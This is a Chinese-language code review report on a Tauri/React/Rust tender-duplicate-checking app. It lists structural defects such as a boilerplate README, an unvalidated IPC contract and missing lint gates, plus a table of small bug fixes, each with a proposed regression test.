- 【连带缺陷，务必一并修】BUILD.md:47 仍写『macOS(universal) / Windows / Linux 三平台构建』，与 release.yml:19-26(macos-latest 原生 arm64，无 universal 目标)及顶部提交 4078315(revert macOS universal → arm64 only)矛盾;CHANGELOG.md:25 也遗留『macOS 构建改 universal(含 Intel)』的过时描述。README 新增下载矩阵时必须写 arm64-only，且顺手把 BUILD.md:47 / CHANGELOG.md:25 的 universal 措辞纠正为 arm64，否则三处文档口径打架、继续误导 Intel 用户。这与用户 MEMORY『macOS 仅 arm64』一致。
- 无源码/配置副作用；不触发 CI 失败。

**钉死测试**

放 src/utils/readme.test.ts(与现有 src/utils/*.test.ts 同目录，npm run test=vitest run 已配)。用例名 `README 是产品首页而非脚手架样板`。关键断言(读根 README 原文)：
```ts
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { describe, it, expect } from 'vitest';
const readme = readFileSync(resolve(__dirname, '../../README.md'), 'utf8');
describe('README', () => {
  it('不是 Tauri 脚手架样板', () => {
    expect(readme).not.toMatch(/# Tauri \+ React \+ Typescript/);
    expect(readme).not.toMatch(/This template should help get you started/);
  });
  it('介绍产品与离线承诺', () => {
    expect(readme).toMatch(/标书查重|BidGuard/);
    expect(readme).toMatch(/离线|本地处理/);
  });
  it('声明 macOS 仅 arm64 平台限制', () => {
    expect(readme).toMatch(/arm64|Apple 芯片/);
  });
});
```
旧代码必失败(命中脚手架正则、缺产品/离线/arm64 关键词)，重写后通过。备选：也可写 Rust 侧 include_str! 断言，但 JS 测试与现有 src/utils 测试基建一致、成本最低。

**对原发现的修正**

1) 行号/篇幅：原发现称『7 行』，实际文件 8 行(7 行内容 + 末尾单个换行，od -c 确认 378 字节)，属同文件内偏移，不影响结论。2) 机制补强(非推翻)：原发现称『BUILD.md 面向构建者不替代首页』正确;但复核额外发现连带缺陷——BUILD.md:47 与 CHANGELOG.md:25 仍残留过时的『macOS universal(含 Intel)』描述，与已合入的 arm64-only 事实(release.yml:19-26、提交 4078315)相矛盾,重写 README 加下载矩阵时应一并纠正这两处以免三文档口径打架。3) 严重级 STRUCT 判定准确：这是对外沟通/可信度缺陷，不涉运行时/安全/误告，定 STRUCT(非 CRIT)恰当，非设计取舍(脚手架样板显然是遗漏而非有意)。

---

### S15 · TS↔Rust IPC 契约纯手写镜像、call<T> 零运行时校验，前端测试全部困在 src/utils，跨语言重命名无人拦截

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** M

**位置**
- `src/api/types.ts:1`
- `src/api/client.ts:21-30`
- `src/stores/progressStore.ts:42-47`
- `src/queries/data.ts:1`
- `src-tauri/src/db/repo/job_repo.rs:7-30`
- `src-tauri/src/jobs/progress.rs:7-30`
- `.github/workflows/ci.yml:22-29`

**机制（逐环调用链）**

逐环调用链（Rust 出→TS 消费，字段名是唯一契约、无任何机器校验）：
1) src-tauri/src/db/repo/job_repo.rs:7-8 `JobRow` 派生 `Serialize` + `#[serde(rename_all="camelCase")]`，把 snake_case 字段（如 error_code / matrix_json / collusion_level / finished_at）序列化为 camelCase（errorCode/matrixJson/collusionLevel/finishedAt）。src-tauri/src/jobs/progress.rs:7-30 `JobProgress`/`JobTerminal` 同理，事件 payload 走 camelCase。
2) 序列化产物经 Tauri invoke（命令返回值）或 Emitter（progress.rs:59-73 `app.emit`）跨进程送到前端，全程是无 schema 的 JSON。
3) src/api/client.ts:21-30 `call<T>(cmd,args)` = `return await invoke<T>(cmd,args)` —— `invoke<T>` 只是把 unknown 结果**盲断言**为 T，`asApiError`(14-19) 只归一化错误，成功路径无任何字段校验/缺省填充。
4) src/api/types.ts:1 头注释自证「与 Rust serde camelCase 输出一一对应」，`JobDto`(32-49) 等接口是**人手抄写**的镜像；无 tauri-specta/specta/ts-rs/typeshare（Cargo.toml、package.json 均无，已 grep 确认）生成，无 fixture 对拍。
5) 消费端直接按 camelCase 键取值且 TS 认为一定存在：src/screens/JobsList.tsx:45 `j.matrixJson`、:63 `j.collusionLevel==="high"`；src/screens/Export.tsx:274 `data.job.collusionLevel`、:322 `data.job.finishedAt`；src/screens/WorkspaceList.tsx:88 `w.latestJobStatus`；src/screens/Running.tsx:75 / CompareSetup.tsx:245-251 `prog.percent`；progressStore.ts:19/21 用 `p.jobId`/`t.jobId` 做 record 键。
错误结果：若 Rust 侧改一个 serde 字段名（或加 `#[serde(rename)]`/删字段），序列化键与 TS 镜像**静默错位**。invoke 断言不报错，取值得到 `undefined`。
6) 拦截缺口（.github/workflows/ci.yml:22-29）：`npm run build`(tsc) 只做 TS **内部**一致性检查，看不到 Rust；`npm test`=vitest run 只有 26 用例全在 src/utils（chunkType 11 / templateParse 9 / docTag 3 / clusterUi 3），api/client、queries/data、stores/progressStore、14 screens、11 components 零测试；`cargo test --lib` 只测 Rust 侧、不校验 TS。两侧各自全绿，运行期才在真实评标界面暴露 `undefined`（如 collusionLevel 恒 falsy → 「需复核」徽标永不亮；matrixJson undefined → 迷你矩阵消失；percent undefined → 进度条恒 0）。

**最小复现**

评审员导入 3 份 25 页扫描件跑围标检测，本应命中 collusion=high。某次 Rust 重构把 job_repo.rs 的 `collusion_level` 加了 `#[serde(rename="collusionRisk")]`（或直接改 map_row 的 json_extract 别名），开发者只跑了 `cargo test --lib`（绿）与本地 `npm run build`+`npm test`（tsc 绿，因 types.ts 仍写 collusionLevel 自洽；vitest 26 用例与该字段无关全绿）。CI 同样两侧全绿并合入。上线后：JobsList.tsx:63 `j.collusionLevel` 恒为 undefined，`needsReview` 恒 false，围标高危任务在列表**不再显示「需复核」徽标**；Export.tsx:274 `level` 回退 "none"，导出报告把高危判成无风险 —— 直接违背「宁转人工不误告」核心价值观，且无任何报错、日志或测试提示。

**影响面**

影响面：全部跨 IPC 数据流（工作区/文档/任务/比对/围标/进度事件），即所有默认路径都命中，无需特殊配置。严重度：STRUCT 合理——不是当前有 bug，而是**契约漂移的结构性零防护**：任何 Rust serde 字段重命名/增删都能静默穿透到 UI，最坏落在围标徽标/进度/矩阵等取证判定上（误漏告）。发生频率：字段重构是常规演进动作，本仓 DTO 结构多（types.ts 约 40 个接口）、双人跨语言，撞上只是时间问题；且一旦发生因无测试兜底，靠肉眼在 14 个未测 screen 里发现，逃逸概率高。

**修复设计**（尚未落地）

分两层，先补契约拦截（治本），再补失效逻辑测试（治标）。不改任何文件，仅设计：

【A. 契约层——推荐 fixture 对拍，改动最小且离线】
1) Rust 侧加一个 `#[cfg(test)]` 序列化样本导出测试（放 src-tauri/src/jobs/progress.rs 与 job_repo.rs 等 DTO 所在文件的 tests mod，或集中到 src-tauri/tests/contract.rs）：构造每个 DTO 的样例实例，`serde_json::to_value` 后断言键集合等于硬编码期望 camelCase 键数组，例如：
```rust
#[test] fn job_row_camel_keys(){
  let v = serde_json::to_value(sample_job_row()).unwrap();
  let keys: BTreeSet<_> = v.as_object().unwrap().keys().cloned().collect();
  assert_eq!(keys, expected(&["id","workspaceId","jobType",...,"collusionLevel","finishedAt"]));
}
```
这样 Rust 侧任何 rename/增删字段**在 cargo test 就红**（把静默漂移变成本语言可见失败）。
2) 把同一份 expected 键数组落成一个共享 JSON fixture（如 src-tauri/tests/fixtures/dto_keys.json），前端加一个 vitest 用例读该 fixture 对比 TS 类型键：因 TS 类型运行时不可见，用 `satisfies Record<keyof JobDto, true>` 的常量键表 + fixture 断言相等，任一侧漏改即红。
代价：需为每个 DTO 维护样例，约 40 个接口——可只覆盖跨事件/取证关键 DTO（JobRow/JobProgress/JobTerminal/CompareSummaryDto/ClusterSummaryDto/WorkspaceDto/DocumentDto）先止血。

【B. 若接受引入依赖：tauri-specta】
在 Cargo.toml 加 tauri-specta + specta，给命令返回类型派生 `specta::Type`，build 期生成 src/api/generated.ts，types.ts 手抄接口改为 re-export 生成类型。副作用大：需给全部 DTO 派生 Type、改 types.ts/index.ts 引用、CI 加「生成物无 diff」校验，且违反用户「谨慎引入新依赖」——列为备选，非默认推荐。

【C. 失效逻辑测试（无论 A/B 都要补）】
为 src/stores/progressStore.ts 写 vitest：mock `@tauri-apps/api/event` 的 listen，注入 terminal payload，断言 `initJobEvents` 对 queryClient.invalidateQueries 的调用键集合（import 分支含 documents；compare 分支含 job/compareSummary/clusters/cluster，见 progressStore.ts:56-63）与 onTerminal 写入 record 正确。

需一并改：ci.yml 无需改结构（A 方案 cargo test / npm test 自动带上新用例）；types.ts:1 头注释应从「人手一一对应」更新为指向 fixture/生成机制；若走 B 需加迁移说明与生成脚本 npm script。

**钉死测试**

三个，旧代码必失败/无法建立、修复后通过：
1) Rust：`src-tauri/src/db/repo/job_repo.rs`(tests mod) `fn job_row_serializes_expected_camel_keys()` —— 断言 `serde_json::to_value(sample).as_object().keys()` == 期望集合（含 collusionLevel/matrixJson/finishedAt/errorCode）。故意在别处把 collusion_level rename 掉即红。旧代码无此测试，属新增护栏；验证方式：临时改 serde rename 应使其失败。
2) 前端契约：`src/api/types.contract.test.ts` `it('JobDto keys match Rust fixture')` —— 读 src-tauri/tests/fixtures/dto_keys.json，断言 `Object.keys(jobDtoKeyTable)` 与 fixture.JobRow 数组相等（jobDtoKeyTable 用 `satisfies Record<keyof JobDto,true>` 保证与 TS 类型同步）。任一侧漏改即红。
3) 前端失效逻辑：`src/stores/progressStore.test.ts` `it('compare terminal invalidates compareSummary/clusters, not documents')` —— mock listen 注入 `{jobId:'j1',jobType:'compare',status:'completed'}`，断言 invalidateQueries 被以 queryKey ['compareSummary','j1'] 和 ['clusters','j1'] 调用、且未以 ['documents'] 调用。旧代码此逻辑无测试，重构失效分支会静默漏刷新——此测试将其钉住。

**对原发现的修正**

机制、行号、位置、计数全部属实并已按当前代码校正：types.ts:1 头注释、client.ts:21-30 盲断言、26 用例全在 src/utils(4 文件)、14 screens+11 components+queries/data.ts+stores/progressStore.ts 零测试、CI 两侧分跑——均逐一 Read 确认。严重级 STRUCT 恰当（结构性零防护而非当下 bug）。两点细化：(1) 原述「任一侧字段重命名全绿」需限定方向——**TS-only 重命名 tsc 会红**（usage 站点报错，如 JobsList/Export 直接按键取值），真正静默穿透的是 **Rust serde 侧 rename/增删字段**：镜像是「单向盲」，TS 看不见 Rust。(2) client.ts 的 call<T> 并非完全「零处理」——它对**错误**路径有 asApiError 归一化(14-19)，只是**成功**路径零字段校验；表述应精确为「成功返回值零运行时校验」。不影响结论，属于把话说准。其余无不准确。

---

### S16 · 前端无 lint(ESLint/react-hooks)门禁，无 pre-commit 钩子；exhaustive-deps 全程不受检

**级别** 🟠 STRUCT · **工作量** M

**位置**
- `package.json:6-12 (scripts 无 lint)`
- `package.json:30-38 (devDependencies 无 eslint/biome/prettier)`
- `.github/workflows/ci.yml:20-29 (前端仅 npm install + npm run build + npm test，无 lint 步骤)`
- `src/screens/ClustersScreen.tsx:68-72 (useEffect 依赖整个 react-query 对象 q，典型 exhaustive-deps 隐患)`
- `src/screens/CompareSetup.tsx:83 与 115 (inert eslint-disable react-hooks/exhaustive-deps)`
- `src/theme.tsx:111 (inert eslint-disable react-refresh/only-export-components)`

**机制（逐环调用链）**

逐环调用链（均已 Read 当前代码核实）：
1) 门禁缺口源头 — package.json:6-12 scripts 只有 dev/build/preview/tauri/test，无 lint；devDependencies(30-38) 只有 @tauri-apps/cli、@types/react(-dom)、@vitejs/plugin-react、typescript~5.8.3、vite^7、vitest^4，无 eslint / @biomejs / prettier。root 下无 .eslintrc* / eslint.config.* / biome.json（ls 确认 no matches），package-lock.json grep eslint/biome/prettier 命中数为 0，node_modules/.bin 无任何 lint 二进制。
2) 无 pre-commit — 无 .husky 目录，git config core.hooksPath 为空（未设置）。commit 路径上没有任何前端静态检查。
3) CI 只覆盖 Rust 的静态检查 — ci.yml:26-27 有 `cargo clippy ... -D warnings`（Rust 警告即失败），但前端步骤仅 22-23 行 `npm run build`（= tsconfig.json:8 的 `tsc && vite build`）+ 25 行 `npm test`（vitest run）。tsc 只做类型检查，React Hooks 规则不属于类型系统，tsc 抓不到 exhaustive-deps。
4) 后果落到真实代码 — 因为没有 react-hooks/exhaustive-deps 规则在跑：
   • ClustersScreen.tsx:68-72 的无限滚动 useEffect 依赖数组是 `[lastIndex, items.length, q]`，其中 q 是 useClustersInfinite 返回的整个 react-query 对象，每次 render 都是新引用；正确写法应依赖 q.hasNextPage / q.isFetchingNextPage / q.fetchNextPage 三个稳定值。这正是 exhaustive-deps 会给出精确修正的场景，现在无人把关。
   • CompareSetup.tsx:83 和 115 有两处 `// eslint-disable-next-line react-hooks/exhaustive-deps`，theme.tsx:111 有一处 `react-refresh/only-export-components` 抑制。git 历史确认 eslint 从未进过 package.json、从未提交过任何 eslint 配置——也就是说这些 disable 注释从开发者手写起就是 inert（对不存在的检查器抑制不存在的规则）。开发者以为有 linter 在把关，实际根本没有，等于给了虚假的安全感：被 disable 那两行不受检是显式的，其余 30+ 个 useEffect / 42 个 useCallback·useMemo 的依赖数组则是全程零检查。
结论：每一环当前属实，机制成立。

**最小复现**

工程门禁复现：在 main@4078315 clean worktree 执行 `npm run lint` → 报 'Missing script: lint'（scripts 无此项）。执行 `ls .husky; git config core.hooksPath` → 均空。查 ci.yml 前端三步（install/build/test）无 lint。
真实业务触发路径（这正是 v0.5.0 才手工修掉的那类 bug）：评标员一次导入 8 份各 40 页的投标标书发起比对，进入『重复条款』屏（ClustersScreen），聚合出上千组跨文档雷同条款需要向下滚动分页加载。若 ClustersScreen.tsx:68-72 的 effect 依赖数组写错（依赖整个 q 对象而非其稳定字段），effect 会在每次 render 重跑，触发条件命中时把 q.fetchNextPage 反复排队 → 要么无限翻页把后续页一次性拉空、要么在 isFetchingNextPage 竞态下重复请求，评标员看到列表卡顿或条款数跳变，对『可举证报告』的完整性产生怀疑。CHANGELOG v0.5.0『无限滚动移入 effect』与 v0.4.0『双击开始比对重复建任务/Markdown 锚点多实例串位/迷你矩阵空输入守卫』等多条交互修复，实证这类 hooks/render 副作用 bug 在本项目反复发生，而当前无任何自动门禁拦截它们。

**影响面**

受影响方：(1) 所有前端交互屏——src 下 14 个文件含 useEffect（共 36 处 useEffect、42 处 useCallback/useMemo），全部依赖数组零静态检查；(2) 评标员（终端用户）——hooks 依赖 bug 直接表现为列表加载错乱、重复请求、状态不同步，动摇『可举证报告』可信度，与核心价值观『宁转人工不误告』相悖；(3) 维护者——回归全靠人工 code review + 事后 CHANGELOG 补救。
默认配置是否命中：命中。这不是可选开关——任何开发者本地 commit 与任何 CI 运行都不含前端 lint，100% 覆盖，无绕过即触发。
严重程度：STRUCT 恰当。不是运行时崩溃（非 CRIT），但是横切整个前端工程的质量门禁缺失，且已有历史 bug 佐证其实际造成过缺陷。
发生频率：门禁缺失是常态（每次提交都缺）；具体 hooks bug 逃逸频率为中——CHANGELOG 近两个版本至少 4~5 条相关交互修复即为逃逸样本。

**修复设计**（尚未落地）

目标：加最小化前端静态门禁，重点是 react-hooks 规则，并接入 CI（可选加 pre-commit）。不改任何业务逻辑。

1) 依赖（devDependencies，用 ESLint flat config 现代栈）：
   eslint@^9、@eslint/js、typescript-eslint、eslint-plugin-react-hooks@^5、eslint-plugin-react-refresh、globals。（选型理由：项目本就有 3 处 react-hooks/react-refresh 的 eslint-disable 注释，说明当初按 Vite React 模板设计，补回 ESLint 与既有注释语义一致、零改注释成本；Biome 目前 react-hooks 规则覆盖不如 eslint-plugin-react-hooks 精细，故不选 Biome。）

2) 新增 eslint.config.js（flat config，伪代码）：
   import js from '@eslint/js'; import tseslint from 'typescript-eslint';
   import reactHooks from 'eslint-plugin-react-hooks';
   import reactRefresh from 'eslint-plugin-react-refresh';
   import globals from 'globals';
   export default tseslint.config(
     { ignores: ['dist','src-tauri','node_modules'] },
     js.configs.recommended,
     ...tseslint.configs.recommended,
     { files:['src/**/*.{ts,tsx}'],
       languageOptions:{ globals: globals.browser },
       plugins:{ 'react-hooks': reactHooks, 'react-refresh': reactRefresh },
       rules:{ ...reactHooks.configs.recommended.rules,
               'react-refresh/only-export-components':['warn',{allowConstantExport:true}] } }
   );
   （注意：react-hooks/exhaustive-deps 默认是 warn；门禁要生效必须在 lint 脚本加 --max-warnings 0，否则 warn 不致失败=形同虚设。）

3) package.json scripts 增：
   "lint": "eslint . --max-warnings 0"
   （--max-warnings 0 让 exhaustive-deps 的 warn 也能 fail，这是本修复的关键，别漏。）

4) ci.yml：在第 23 行 `npm run build` 之后、第 25 行 `npm test` 之前插入一步：
   - name: 前端 Lint（警告即失败）
     run: npm run lint
   （与既有 Rust clippy -D warnings 门禁对齐，形成前后端一致的『警告即失败』基线。）

副作用与需一并处理（重要）：
 a) 一旦 lint 生效，ClustersScreen.tsx:68-72 会立刻报 exhaustive-deps（依赖 q 整体）。修复本条 lint 门禁会连带暴露这个真实告警——需在同一 PR 内把依赖改为 `[lastIndex, items.length, q.hasNextPage, q.isFetchingNextPage, q.fetchNextPage]`，否则 CI 立即红。这属于门禁落地的预期产出，不是回归。
 b) CompareSetup.tsx:83/115、theme.tsx:111 的三处 eslint-disable 注释在 lint 生效后从 inert 变为真正生效，需人工确认这三处 disable 仍合理（79-84 的 [parsed.length] 与 87-116 的 [wsId] 是有意收窄依赖，属合理抑制，可保留）。
 c) 首次全量 lint 可能在其它 13 个文件冒出零散告警（未用变量已被 tsc 的 noUnusedLocals 覆盖，但 no-explicit-any 等 tseslint 规则可能新增命中）；建议首个 PR 只启用 react-hooks + react-refresh 两个 plugin 的 recommended，tseslint 用较宽档或对存量告警一次性修，避免 PR 过大。
 d) 文档：CHANGELOG 增一条『工程：接入前端 ESLint(react-hooks) 门禁，CI 警告即失败』；BUILD.md 若列了本地校验命令需补 `npm run lint`。无迁移号/DB 变更。
 e) 可选（非必须）：加 husky + lint-staged 做 pre-commit `eslint --max-warnings 0`；但 CI 门禁已足够兜底，pre-commit 属加分项，可放后续。

**钉死测试**

门禁类问题的 pinning 走『配置断言测试』而非业务单测（本项目已有 vitest，src/utils/*.test.ts 4 个，可复用基础设施）。
新增 src/__meta__/lint-gate.test.ts（或 src/utils/lintGate.test.ts）：
  import pkg from '../../package.json';
  import { existsSync } from 'node:fs';
  import { readFileSync } from 'node:fs';
  describe('前端 lint 门禁', () => {
    it('package.json 存在 lint 脚本且带 --max-warnings 0', () => {
      expect(pkg.scripts.lint).toBeDefined();
      expect(pkg.scripts.lint).toContain('--max-warnings 0');
    });
    it('devDependencies 含 eslint 与 react-hooks 插件', () => {
      const dd = pkg.devDependencies;
      expect(dd.eslint).toBeDefined();
      expect(dd['eslint-plugin-react-hooks']).toBeDefined();
    });
    it('存在 eslint flat config', () => {
      expect(existsSync('eslint.config.js') || existsSync('eslint.config.mjs')).toBe(true);
    });
    it('ci.yml 含前端 lint 步骤', () => {
      expect(readFileSync('.github/workflows/ci.yml','utf8')).toMatch(/npm run lint/);
    });
  });
关键断言：pkg.scripts.lint 含 '--max-warnings 0'（防止有人只加 warn 级 lint 而门禁不生效——这是最容易被糊弄过去的点）、devDeps 有 eslint-plugin-react-hooks、ci.yml 含 `npm run lint`。旧代码全部 4 条断言失败；修复后全通过。
进阶（可选，直接钉 hooks bug）：另加一条会实际跑 eslint 的测试或直接依赖 CI 的 `npm run lint` 在 ClustersScreen.tsx:68-72 上先红后绿，作为端到端证明。

**对原发现的修正**

机制与严重级基本准确，做三点精化（均为增强证据，非推翻）：
1) 行号更新：原发现定位 package.json:6-12（scripts）准确；补充 devDeps 缺口在 30-38 行；ci.yml 前端步骤在 20-29 行、Rust clippy -D warnings 在 26-27 行。
2) 机制强化（原发现未提及的关键证据）：代码里已存在 3 处 eslint-disable 注释（CompareSetup.tsx:83、115 的 react-hooks/exhaustive-deps 与 theme.tsx:111 的 react-refresh/only-export-components），而 git 历史确认 eslint 从未进过 package.json、从未提交过任何 eslint 配置——这些 disable 注释自始 inert，证明开发者主观以为有 linter 把关、实际零把关，比『单纯没配 lint』更值得修（虚假安全感）。同时找到与 CHANGELOG『无限滚动移入 effect』对应的真实代码 ClustersScreen.tsx:68-72，其依赖数组依赖整个 react-query 对象 q，正是 exhaustive-deps 会精确报出的隐患，为 STRUCT 提供了活体样本。
3) 修复方向补一处易错点：原方向『加 eslint + 接 ci』正确，但必须强调 lint 脚本要带 --max-warnings 0——因为 react-hooks/exhaustive-deps 默认是 warn 级，不加此参数则 CI 不会因 hooks 告警失败，门禁形同虚设。这是原方向未点明、落地时最易漏的关键。其余无不准确，非设计取舍，确认为真实结构性缺陷。

---

## INCR 清单（增量改进，逐条已核实当前代码）

| ID | 位置 | 确认 | 修复 | 工作量 |
|---|---|---|---|---|
| I-corpus | `src-tauri/src/engine/corpus.rs:50-51` | chunker.rs:184-185 heading 块占用 order_para 计数(chunk_type="heading", chunk_level="paragraph")；chunk_repo.rs:117 load_for_compare 带 `AND c.chunk_type != 'heading'`，故 doc_chunk_total(=rows.len(), compare_service.rs:139) 不含 heading，而 row.order_index 含 heading 空档，末行 order_index 可 > doc_chunk_total-1，corpus.rs:51 rel_pos>1.0，进而偏移 build_clusters 的 moved 判定(compare_service.rs:498-503 阈值 0.25)。 | from_row 用「该 level 内非 heading 行的连续序号/(非heading总数-1)」而非落库 order_index：在 load_for_compare 结果里按枚举下标算 rel_pos(row 已 ORDER BY order_index)，或改传 enumerate() 下标作分子。 | S |
| I-subject | `src-tauri/src/services/compare_service.rs:620-625` | fact.rs:314-315 会产出 field="subject" 的 FieldConflict(主体阵营冲突，甲方↔乙方)，且 fact.rs:336 将 subject 纳入 high 风险；但 compare_service.rs:620-625 的 match 只列 amount/duration/date，subject 落入 `_ => "比例"`，摘要误写「关键数字不一致(比例)」。 | 在 match 增加 `"subject" => "主体/付款方"` 分支(或摘要改「同一条款关键信息不一致」通用措辞)，令主体阵营冲突摘要与实际字段一致。 | S |
| I-progress | `src-tauri/src/services/compare_service.rs:428` | Rust 方法调用 `.min()` 绑定紧于 `*`，line 428 实解析为 `(bi+1)*(EMBED_BATCH.min(total))`=`(bi+1)*min(128,total)`；当 total≥128 且多批时，末批 current 溢出(如 total=200、bi=1 → 2*128=256>200)，进度 128%；而同一 progress 调用 line 430 的 message 用了正确的 `((bi+1)*EMBED_BATCH).min(total)`，两者不一致自证 bug。 | 将 line 428 改为 `((bi + 1) * EMBED_BATCH).min(total)`，与 line 430 一致。 | S |
| I-buildraw | `src-tauri/src/engine/clustering.rs:143-150` | line 143-149 对每条边 e 都用 `members.contains(&e.a)`/`contains(&e.b)` 线性扫描 members 后 push，成员去重为 O(边数×成员数)；模板句在多文档大量重复时聚类可含数千成员/边，退化成数百万到数亿次线性比较。 | 用 HashSet<u32> 收集成员去重后再 `members: Vec = set.into_iter().collect(); members.sort_unstable();`(排序已在 line 151 存在)，将去重降为 O(E)。 | S |
| I-utf16 | `src-tauri/src/engine/parse.rs:303-314` | decode_text 仅剥 UTF-8 BOM(EF BB BF, line 304)，然后试 UTF-8(line 309) 失败即无条件回落 GB18030(line 312)；UTF-16LE/BE 的中文 txt(带 FF FE / FE FF BOM)非合法 UTF-8，被 GB18030 硬解成乱码 cow.into_owned() 静默入库，后续分块/查重比的是乱码→跨文档雷同漏报，违反「宁转人工不误告」。 | 在 UTF-8 分支前检测 UTF-16 BOM：`FF FE`→encoding_rs::UTF_16LE、`FE FF`→UTF_16BE 解码；无 BOM 的 UTF-16 可保持现状或加启发式，至少覆盖带 BOM 的常见导出。 | S |
| I-collusiontest | `src-tauri/src/engine/collusion.rs:14-32` | collusion.rs 内 `grep -c '#[test]'`=0；14 个权重/分级常数(SIM_*/CLUSTER_*/META_*/SHARED_*/PRICE_*/LEVEL_*, line 18-32)注释明写「未经实证校准」；唯一护栏是 compare_service.rs 测试中两条粗区间 e2e 断言(line 1344 正例 level∈{high,medium}、line 1386 负例 level∈{none,low})，无任何测试直接 pin assess_with 的加权数值或分级边界。 | 为 assess_with 补单测：构造已知 (peak/clusters/docs/shared_terms/price_pairs) 输入，断言各 signal.weight 与最终 score/level，把当前常数值锁进测试形成回归基线。 | M |
| I-setrunning | `src-tauri/src/db/repo/job_repo.rs:102-108` | set_running(line 103-106) 为 `UPDATE ... status='running' WHERE id=?1`，无 status 过滤；对照 set_cancelling(line 112 `AND status IN ('pending','running')`) 与 finish(line 127 注释明示带状态守卫)。若 execute 与 cancel/重复启动竞态，可把已 cancelling/completed/failed 的任务覆写回 running。 | 给 set_running 加守卫 `WHERE id=?1 AND status IN ('pending')`(或至少排除终态与 cancelling)，并让 jobs/mod.rs:130 依据 rows_affected==0 判定启动失败。 | S |
| I-delws | `src-tauri/src/commands/workspace.rs:57-60` | workspace_repo::delete(line 95) 直接 `DELETE FROM workspaces`，靠外键 ON DELETE CASCADE 级联删文档/chunk/任务/结果(line 93 注释)，无运行中任务检查；而 job_repo::delete(line 218) 对 pending/running/cancelling 返回 JobConflict「任务正在运行，请先取消再删除」。删除含运行中任务的工作区会级联抽走其数据，worker 仍在写→行为不一致且可致竞态/孤儿写。 | delete_workspace 前查 job_repo(如 has_active 或 COUNT status IN('pending','running','cancelling'))，命中则返回 JobConflict，与 delete_job 语义对齐。 | S |
| I-swallow | `src-tauri/src/jobs/mod.rs:116-119` | mark 闭包内 line 117-118 `if let Ok(conn)=db.get() { let _ = job_repo::finish(...); }`：db.get() 失败与 finish() 返回的 Err 均被丢弃、无任何日志，任务终态可能没落库而前端只收到 emit_terminal 事件；违反全局规则「never swallow exceptions，至少 log」。 | 对 db.get() 的 Err 与 finish 的 Err 分别 log(如 tracing::error!/eprintln!，注意规则「日志永不记录标书正文」，仅记 job_id/status/错误码)，不再 let _ 丢弃。 | S |
| I-datetime（refined） | `src-tauri/src/db/repo/job_repo.rs:204-212` | created_at 由 now_iso()(db/mod.rs:14-17) 存为 RFC3339 带 T/毫秒/Z(如 2026-07-02T12:34:56.789Z)，而 line 209 比较 `created_at < datetime('now', ?1)`，SQLite datetime 产出空格分隔无毫秒无 Z(2026-07-02 12:34:56)；两者按字典序比较，'T'(0x54)>' '(0x20)，边界同日的 T 串排在阈值之后→不会被删。方向保守(不会误删多删)，但依赖隐性字符串契约，边界日不精确，未来若改 created_at 格式易踩坑。 | 两侧统一为可比格式：用 `datetime(created_at) < datetime('now', ?1)` 让 SQLite 归一解析，或阈值也生成同款 RFC3339 串比较，消除格式不对齐。 | S |
| I-vacuum | `src-tauri/src/commands/tools.rs:125-127` | vacuum_db(line 126 `conn(&state)?.execute_batch("VACUUM")`) 与 run_diagnostics 的 integrity_check(line 173 `PRAGMA integrity_check`) 均在 async 命令体内直接同步执行，未包 tauri::async_runtime::spawn_blocking；对照同文件 tools.rs:57/77、document.rs:86、export.rs:50 的阻塞操作都已 spawn_blocking。大库 VACUUM/完整性检查可数秒到数十秒，阻塞 async runtime worker 且长期占用池连接(conn())。 | 将 VACUUM 与 integrity_check 各自移入 `tauri::async_runtime::spawn_blocking(move \|\| { ... })` 并 await，连接在闭包内获取释放，避免阻塞 runtime worker。 | S |
| I-kbd | `src/screens/JobsList.tsx:98-106` | 行容器 onKeyDown(JobsList.tsx:70-75) 在 Enter/Space 时 nav(jobRoute(j))；星标 onKeyDown(98) 与删除 onKeyDown(169) 只 e.preventDefault() 不 e.stopPropagation()，Enter 会先 mutate 再冒泡到行触发跳转（对照 WorkspaceList.tsx:167/196 均有 e.stopPropagation()）。 | 在 JobsList.tsx:99 与 170 的 if 分支内 e.preventDefault() 后各加一行 e.stopPropagation()。 | S |
| I-border | `src/screens/ClusterDetail.tsx:484-485` | MemberNote 样式先 borderLeft:"3px solid #C28430"(484) 再 border:`1px solid ${border}`(485)，后写的 border 简写覆盖含左边框在内的四边，琥珀条被抹掉（对照 DocPreview.tsx:515-516 AnnBubble 先 border 后 borderLeft 顺序正确）。 | 调换两行顺序：把 border:`1px solid ${border}` 放在 borderLeft:"3px solid #C28430" 之前。 | S |
| I-systheme | `src/theme.tsx:31-37` | resolveDark(theme.tsx:34-35) 只在 loadTheme 与 set(mode) 时读一次 matchMedia('(prefers-color-scheme: dark)').matches，全文件无 addEventListener('change') 订阅（grep 确认），mode='system' 时运行中系统切换主题 t.dark 不更新，界面不跟随。 | 在 ThemeProvider 加 useEffect：当 t.mode==='system' 时对 matchMedia('(prefers-color-scheme: dark)') addEventListener('change', e=>setT(prev=>({...prev,dark:e.matches}))) 并在 cleanup 中 removeEventListener。 | M |
| I-invalidstorm | `src/queries/data.ts:345-348` | onSettled 调 invalidateQueries({queryKey:['clusters', jobId]})(346)，React Query 对活跃 useInfiniteQuery(useClustersInfinite, CLUSTER_PAGE=60) 默认重取已加载的全部页（每页一次 api.listClusters IPC），深滚动 N 页时每次人工确认 = N 次 IPC；且 onMutate 已做列表乐观更新（325-337），该失效属冗余重取。 | 把 onSettled 对 ['clusters', jobId] 的失效去掉（乐观更新已覆盖列表标签），仅失效 ['cluster', clusterId]；若需服务端一致性，改用 refetchType:'none' 或标记 stale 待下次进入时再取。 | S |
| I-exportinit | `src/screens/Export.tsx:47-58` | exportCfg 取自 useAppSettings()(46-48)，fmt/includeRawText/includeConfig 均用 useState 惰性初始化器(50-58) 只在首渲染读一次 exportCfg；深链直达 Export 时 appSettings 尚未返回(appCfg=undefined→exportCfg={})，此时 includeRawText 退到硬编码默认 true，data 到达后无 effect 回填，用户「不导出正文全文」的设置被静默忽略，正文仍随导出泄出。 | 改用 useEffect 监听 appCfg 到达后同步一次三个状态（仅当用户未手动改动时），或对 Export 内容用 enabled/isSuccess 门控渲染，确保 appSettings 命中后再初始化默认项。 | M |
